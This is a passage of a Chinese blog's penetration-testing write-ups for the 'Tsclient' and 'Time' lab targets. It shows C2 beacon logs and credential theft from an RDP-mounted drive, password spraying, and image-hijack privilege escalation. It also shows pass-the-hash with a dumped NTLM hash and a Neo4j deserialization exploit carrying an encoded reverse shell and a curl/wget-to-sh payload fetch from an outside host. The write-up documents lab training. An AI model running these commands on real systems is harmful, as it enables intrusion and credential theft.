src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/16.png"></p><p>可以看到挂载的C盘也为\TSCLIENT\</p><p>靶机的名字</p><p>查看一下有没有什么敏感信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">05</span>] beacon&gt; shell <span class="built_in">dir</span> \\TSCLIENT\C</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">05</span>] [*] Tasked beacon to run: <span class="built_in">dir</span> \\TSCLIENT\C</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">05</span>] [+] host called home, sent: <span class="number">47</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">05</span>] [+] received output:</span><br><span class="line"><span class="string">&#x27;\\TSCLIENT\C&#x27;</span></span><br><span class="line">用作为当前目录的以上路径启动了 CMD.EXE。</span><br><span class="line">UNC 路径不受支持。默认值设为 Windows 目录。</span><br><span class="line"> 驱动器 \\TSCLIENT\C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C2C5<span class="literal">-9D0C</span></span><br><span class="line"></span><br><span class="line"> \\TSCLIENT\C 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span>/<span class="number">07</span>/<span class="number">12</span>  <span class="number">10</span>:<span class="number">34</span>                <span class="number">71</span> credential.txt</span><br><span class="line"><span class="number">2022</span>/<span class="number">05</span>/<span class="number">12</span>  <span class="number">17</span>:<span class="number">04</span>    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">2022</span>/<span class="number">07</span>/<span class="number">11</span>  <span class="number">12</span>:<span class="number">53</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2022</span>/<span class="number">05</span>/<span class="number">18</span>  <span class="number">11</span>:<span class="number">30</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2022</span>/<span class="number">07</span>/<span class="number">11</span>  <span class="number">12</span>:<span class="number">47</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2022</span>/<span class="number">07</span>/<span class="number">11</span>  <span class="number">12</span>:<span class="number">45</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">1</span> 个文件             <span class="number">71</span> 字节</span><br><span class="line">               <span class="number">5</span> 个目录 <span class="number">30</span>,<span class="number">035</span>,<span class="number">951</span>,<span class="number">616</span> 可用字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">49</span>] beacon&gt; shell <span class="built_in">type</span> \\TSCLIENT\C\credential.txt</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">49</span>] [*] Tasked beacon to run: <span class="built_in">type</span> \\TSCLIENT\C\credential.txt</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">49</span>] [+] host called home, sent: <span class="number">63</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">49</span>] [+] received output:</span><br><span class="line"><span class="string">&#x27;\\TSCLIENT\C&#x27;</span></span><br><span class="line">用作为当前目录的以上路径启动了 CMD.EXE。</span><br><span class="line">UNC 路径不受支持。默认值设为 Windows 目录。</span><br><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Do</span> you know how to hijack Image?</span><br></pre></td></tr></table></figure><p>可以看到提醒了映像劫持，还给了账号密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> crackmapexec smb <span class="number">172.22</span>.<span class="number">8.0</span>/<span class="number">24</span> <span class="literal">-u</span> <span class="string">&#x27;Aldrich&#x27;</span> <span class="literal">-p</span> <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/17.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span></span><br><span class="line">/usr/lib/python3/dist<span class="literal">-packages</span>/paramiko/transport.py:<span class="number">219</span>: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed <span class="keyword">in</span> a future release</span><br><span class="line">  <span class="string">&quot;class&quot;</span>: algorithms.Blowfish,</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.18</span>     <span class="number">445</span>    WIN<span class="literal">-WEB</span>          [*] Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span> x64 (name:WIN<span class="literal">-WEB</span>) (domain:WIN<span class="literal">-WEB</span>) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.46</span>     <span class="number">445</span>    WIN2016          [*] Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span> x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.15</span>     <span class="number">445</span>    DC01             [*] Windows <span class="number">10.0</span> Build <span class="number">20348</span> x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.31</span>     <span class="number">445</span>    WIN19<span class="literal">-CLIENT</span>     [*] Windows <span class="number">10.0</span> Build <span class="number">17763</span> x64 (name:WIN19<span class="literal">-CLIENT</span>) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.18</span>     <span class="number">445</span>    WIN<span class="literal">-WEB</span>          [-] WIN<span class="literal">-WEB</span>\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_LOGON_FAILURE </span></span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.46</span>     <span class="number">445</span>    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.15</span>     <span class="number">445</span>    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.31</span>     <span class="number">445</span>    WIN19<span class="literal">-CLIENT</span>     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/18.png"></p><p>那么需要修改密码，其实kali直接rdp也可以修改密码（这里并没有成功）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python smbpasswd.py xiaorang.lab/Aldrich:<span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span>@<span class="number">172.22</span>.<span class="number">8.15</span> <span class="literal">-newpass</span> <span class="string">&#x27;Admin123$%&#x27;</span></span><br><span class="line"></span><br><span class="line">proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:<span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span>@<span class="number">172.22</span>.<span class="number">8.15</span> <span class="literal">-newpass</span> <span class="string">&#x27;Admin123$%&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop <span class="literal">-u</span> Aldrich <span class="literal">-d</span> xiaorang.lab <span class="literal">-p</span> Ald@rLMWuy7Z <span class="literal">-g</span> <span class="number">1920</span>x1080 <span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">3389</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">impacket</span>-<span class="number">0.11</span><span class="type">.0</span>/<span class="type">examples</span>]</span><br><span class="line">└─<span class="comment"># proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Admin123$%&#x27;</span></span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains4.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">Impacket v0.<span class="number">11.0</span> - Copyright <span class="number">2023</span> Fortra</span><br><span class="line"></span><br><span class="line">===============================================================================</span><br><span class="line">  Warning: This functionality will be deprecated <span class="keyword">in</span> the next Impacket version  </span><br><span class="line">===============================================================================</span><br><span class="line"></span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">445</span>  ...  OK</span><br><span class="line">[!] Password is expired, trying to bind with a null session.</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">445</span>  ...  OK</span><br><span class="line">[*] Password was changed successfully.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>连域控发现连不上</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/19.png"></p><p>转发上线</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect <span class="number">172.22</span>.<span class="number">8.46</span> <span class="number">8899</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/20.png"></p><p>前面还提到了映像劫持</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-acl</span> <span class="literal">-path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="built_in">fl</span> *</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/21.png"></p><p>放大镜提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/22.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/23.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/24.png"></p><p>在这里再次运行cs木马，连接，成功上线</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect <span class="number">172.22</span>.<span class="number">8.46</span> <span class="number">8899</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/25.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/26.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/27.png"></p><p>信息收集，发现本地WIN2016$也在域管组内</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">08</span>] beacon&gt; shell net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">09</span>] [*] Tasked beacon to run: net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">09</span>] [+] host called home, sent: <span class="number">64</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">09</span>] [+] received output:</span><br><span class="line">这项请求将在域 xiaorang.lab 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Admins</span><br><span class="line">注释     指定的域管理员</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            WIN2016<span class="variable">$</span>                 </span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抓取密码本机密码进行横向</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/28.png"></p><p>那么接下来就是pth了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : WIN2016<span class="variable">$</span></span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : <span class="number">0</span>b7ee75356ad0ffa0902a954b9561a11</span><br><span class="line"> * SHA1     : <span class="number">5</span>b852756a3ea35073888a569b3f72dc34600d101</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py <span class="literal">-hashes</span> :<span class="number">0</span>b7ee75356ad0ffa0902a954b9561a11 xiaorang.lab/WIN2016<span class="variable">$</span>@<span class="number">172.22</span>.<span class="number">8.15</span> <span class="literal">-codec</span> gbk</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/29.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/30.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/31.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/32.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Time</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>39.98.115.43</p><p>fscan信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan火绒<span class="number">6.0</span>免杀版\未免杀<span class="number">5</span>号黯区红队开发的fscan图形化和plus&gt;fscan.exe <span class="literal">-h</span> <span class="number">39.98</span>.<span class="number">115.43</span></span><br><span class="line"></span><br><span class="line">  ______                   _____  _</span><br><span class="line"> |  ____|                 |  __ \| |</span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___</span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/</span><br><span class="line">                     fscan version: <span class="number">1.8</span>.<span class="number">4</span> TeamdArk5 v1.<span class="number">0</span></span><br><span class="line"><span class="built_in">start</span> infoscan</span><br><span class="line"><span class="number">39.98</span>.<span class="number">115.43</span>:<span class="number">22</span> open</span><br><span class="line"><span class="number">39.98</span>.<span class="number">115.43</span>:<span class="number">7687</span> open</span><br><span class="line">[*] alive ports len is: <span class="number">2</span></span><br><span class="line"><span class="built_in">start</span> vulscan</span><br><span class="line">[*] WebTitle https://<span class="number">39.98</span>.<span class="number">115.43</span>:<span class="number">7687</span> code:<span class="number">400</span> len:<span class="number">50</span>     title:None</span><br><span class="line">已完成 <span class="number">1</span>/<span class="number">2</span> [-] ssh <span class="number">39.98</span>.<span class="number">115.43</span>:<span class="number">22</span> admin Aa123456 ssh: handshake failed: ssh: unable to authenticate, attempted methods [<span class="type">none</span>], no supported methods remain</span><br><span class="line">已完成 <span class="number">2</span>/<span class="number">2</span></span><br><span class="line">[*] 扫描结束,耗时: <span class="number">1</span>m9.<span class="number">6410405</span>s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫出来个7687端口，有点陌生，查一下</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/1.png"></p><h2 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h2><h3 id="flag01-CVE-2021-34371"><a href="#flag01-CVE-2021-34371" class="headerlink" title="flag01-CVE-2021-34371"></a>flag01-<font style="background-color:#81BBF8;">CVE-2021-34371</font></h3><p>在Neo4j 3.4.18及以前，如果开启了Neo4j Shell接口即1337，攻击者将可以通过RMI协议以未授权的身份调用任意方法，其中 <code>setSessionVariable</code> 方法存在反序列化漏洞。<br>因为这个漏洞并非RMI反序列化，所以不受到Java版本的影响。在Neo4j 3.5及之后的版本，Neo4j Shell被Cyber Shell替代。</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/2.png"></p><p>需要开放1337端口，上面这里写错了<img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/3.png"></p><p>探测一下</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/4.png"></p><p>ok，服务器上监听，直接通过反序列化使靶机反弹shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="literal">-lvvp</span> <span class="number">1124</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/5.png"></p><p>通过neo4j利用工具打，可以在本地运行（不用服务器也行）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-jar</span> rhino_gadget.jar rmi://<span class="number">39.98</span>.<span class="number">115.43</span>:<span class="number">1337</span> <span class="string">&quot;bash -c &#123;echo,c2ggLWkgPiYgL2Rldi90Y3AvNDcuMTEzLjIyOS4xMzYvMTEyNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/6.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/7.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/8.png"></p><p>反弹shell成功，这里我们直接上线vshell</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/9.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/10.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">curl</span> <span class="literal">-fsSL</span> <span class="literal">-m180</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8888</span>/slt||<span class="built_in">wget</span> <span class="literal">-T180</span> <span class="literal">-q</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8888</span>/slt)|sh</span><br></pre></td></tr></table></figure><p>读取flag</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/11.png"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="flag02-后渗透web服务（SQL注入）"><a href="#flag02-后渗透web服务（SQL注入）" class="headerlink" title="flag02-后渗透web服务（SQL注入）"></a>flag02-后渗透web服务（SQL注入）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">neo4j@ubuntu:/tmp<span class="variable">$</span> ifconfig</span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">172.22</span>.<span class="number">6.36</span>  netmask <span class="number">255.255</span>.<span class="number">0.0</span>  broadcast <span class="number">172.22</span>.<span class="number">255.255</span></span><br><span class="line">        inet6 fe80::<span class="number">216</span>:<span class="number">3</span>eff:fe0d:b416  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x20&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">0</span>d:b4:<span class="number">16</span>  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">94715</span>  bytes <span class="number">127572526</span> (<span class="number">127.5</span> MB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">22610</span>  bytes <span class="number">3066177</span> (<span class="number">3.0</span> MB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span>.<span class="number">0.1</span>  netmask <span class="number">255.0</span>.<span class="number">0.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0</span>x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">706</span>  bytes <span class="number">60839</span> (<span class="number">60.8</span> KB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">706</span>  bytes <span class="number">60839</span> (<span class="number">60.8</span> KB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看到172.22.6.36&#x2F;24 这一网段</p><p>上传fscan进行内网信息收集，同时搭建隧道代理</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/12.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x fscan</span><br><span class="line">./fscan <span class="literal">-h</span> <span class="number">172.22</span>.<span class="number">6.36</span>/<span class="number">24</span> <span class="literal">-np</span>   <span class="comment">#太慢了</span></span><br><span class="line">./fscan <span class="literal">-h</span> <span class="number">172.22</span>.<span class="number">6.36</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ./fscan <span class="literal">-h</span> <span class="number">172.22</span>.<span class="number">6.0</span>/<span class="number">24</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ 